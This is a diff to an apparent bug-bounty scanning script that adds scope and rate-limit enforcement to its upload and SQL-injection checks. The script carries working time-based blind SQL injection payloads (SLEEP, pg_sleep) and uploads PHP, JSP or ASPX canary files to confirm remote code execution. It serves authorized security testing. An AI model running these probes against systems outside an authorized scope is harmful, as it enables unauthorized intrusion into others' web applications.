@@ -65,6 +65,19 @@ BASE_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
 . "$SCRIPT_DIR/_auth_helper.sh"
 bb_auth_active && bb_auth_banner
 
+# bb_curl() wraps curl with scope + rate-limit enforcement (tools/bb_curl.sh).
+# Wired into Check 0 (upload) and Check 2 (SQLi) only, including their
+# verify_upload_poc()/verify_sqli_poc() helper calls — every other check in
+# this file is untouched and still uses BB_AUTH_ARGS / raw curl directly.
+# Requires BBHUNT_SCOPE_FILE to be set to an existing scope file, same as
+# recon_engine.sh — bb_curl fails loud/closed without it (see is_in_scope()
+# in bb_curl.sh). Unlike recon_engine.sh, there's no up-front pre-flight
+# check here yet, so an unset/missing BBHUNT_SCOPE_FILE will surface as a
+# [FATAL] message from the first bb_curl call inside Check 0 or Check 2,
+# not before either check starts.
+# shellcheck source=tools/bb_curl.sh
+. "$SCRIPT_DIR/bb_curl.sh"
+
 # macOS compatibility: GNU timeout may not exist
 if ! command -v timeout &>/dev/null; then
     if command -v gtimeout &>/dev/null; then
@@ -149,17 +162,20 @@ verify_sqli_poc() {
     log_step "  [VERIFY] Linear scaling check on param #$p_idx ($dialect)..."
     
     # 1. Baseline (0s)
-    T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
+    bb_rate_limit_wait
+    T0_START=$(date +%s%N); bb_curl_no_wait "$url" -sk -o /dev/null --max-time 20; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
 
     # 2. 1s Sleep
     local pl1="'%20AND%20SLEEP(1)--%20"; [ "$dialect" = "postgres" ] && pl1="'||pg_sleep(1)--%20"
     U1=$(echo "$url" | sed "s/=\([^&]*\)/=$pl1/$p_idx")
-    T1_START=$(date +%s%N); curl -sk -o /dev/null --max-time 25 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U1"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
+    bb_rate_limit_wait
+    T1_START=$(date +%s%N); bb_curl_no_wait "$U1" -sk -o /dev/null --max-time 25; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
 
     # 3. 2s Sleep
     local pl2="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && pl2="'||pg_sleep(2)--%20"
     U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
-    T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
+    bb_rate_limit_wait
+    T2_START=$(date +%s%N); bb_curl_no_wait "$U2" -sk -o /dev/null --max-time 30; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
     
     D1=$(( T1 - T0 )); D2=$(( T2 - T1 ))
     # Allow 200ms jitter
@@ -175,7 +191,7 @@ verify_upload_poc() {
     
     # Tech Detection
     local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
-    local headers=$(curl -sk -I --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" || true)
+    local headers=$(bb_curl "$upload_url" -sk -I --max-time 5 || true)
     if echo "$headers" | grep -qi "jsp\|java\|tomcat"; then ext="jsp"; payload='<% out.print("RCE-VAL-" + (7*7)); %>'; fi
     if echo "$headers" | grep -qi "asp\|aspx\|\.net"; then ext="aspx"; payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'; fi
     
@@ -185,12 +201,12 @@ verify_upload_poc() {
     
     for param in "file" "upload" "FileData" "userfile" "image"; do
         # Try upload
-        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$upload_url" > /dev/null || true
+        bb_curl "$upload_url" -sk -F "${param}=@/tmp/${canary}" --max-time 10 > /dev/null || true
 
         # Check common upload dirs
         for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
             local probe_url="${base_url}${dir}${canary}"
-            local resp=$(curl -sk -f --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$probe_url" || true)
+            local resp=$(bb_curl "$probe_url" -sk -f --max-time 5 || true)
             if echo "$resp" | grep -q "RCE-VAL-49"; then
                 log_crit "  [POC-RCE-CONFIRMED] Code Execution Verified: $probe_url"
                 echo "[CONFIRMED] [RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
@@ -221,7 +237,7 @@ if ! skip_has upload; then
     log_step "Detecting catchall behavior..."
     head -10 "$ORDERED_SCAN" | while read -r host; do
         [ -z "$host" ] && continue
-        if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${host}/non_existent_$(date +%s)")" -eq 200 ]; then
+        if [ "$(bb_curl_no_auth "${host}/non_existent_$(date +%s)" -sk -o /dev/null -w "%{http_code}" --max-time 10)" -eq 200 ]; then
             log_warn "Catchall detected: $host"
             CATCHALL_HOSTS="${CATCHALL_HOSTS},${host}"
         fi
@@ -232,7 +248,7 @@ if ! skip_has upload; then
         [[ "$CATCHALL_HOSTS" == *"$host"* ]] && continue
         for path in "${PROBE_PATHS[@]}"; do
             U="${host%/}${path}"
-            if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$U")" -eq 200 ]; then
+            if [ "$(bb_curl_no_auth "$U" -sk -o /dev/null -w "%{http_code}" --max-time 5)" -eq 200 ]; then
                 log_vuln "Found upload path: $U"
                 echo "[INFORMATIONAL] [UPLOAD-CANDIDATE] $U" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
                 if ! skip_has upload-verify && unsafe_method_guard "POST" "$U" "Upload-RCE PoC"; then
@@ -260,7 +276,8 @@ if ! skip_has sqli; then
         log_step "Advanced SQLi verification on top 10 parameterised URLs..."
         head -10 "$PARAMS_FILE" | while read -r url; do
             [ -z "$url" ] && continue
-            T_START=$(date +%s%N); curl -sk -o /dev/null --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url"; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
+            bb_rate_limit_wait
+            T_START=$(date +%s%N); bb_curl_no_wait "$url" -sk -o /dev/null --max-time 10; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
             P_COUNT=$(echo "$url" | grep -o "=" | wc -l | tr -d ' ')
             [ "$P_COUNT" -eq 0 ] && continue
             for i in $(seq 1 "$P_COUNT"); do
@@ -268,7 +285,8 @@ if ! skip_has sqli; then
                     p="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && p="'||pg_sleep(2)--%20"
                     # Fixed sed: use alternate delimiter and correct numeric occurrence
                     SU=$(echo "$url" | sed "s/=\([^&]*\)/=$p/$i")
-                    TS=$(date +%s%N); curl -sk -o /dev/null --max-time 20 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
+                    bb_rate_limit_wait
+                    TS=$(date +%s%N); bb_curl_no_wait "$SU" -sk -o /dev/null --max-time 20 >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
                     if [ "$RC" -eq 0 ] && [ "$((TE - BASE_MS))" -gt 1800 ]; then
                         if verify_sqli_poc "$url" "$i" "$dialect"; then
                             log_crit "EMPIRICAL SQLI POC: $url"
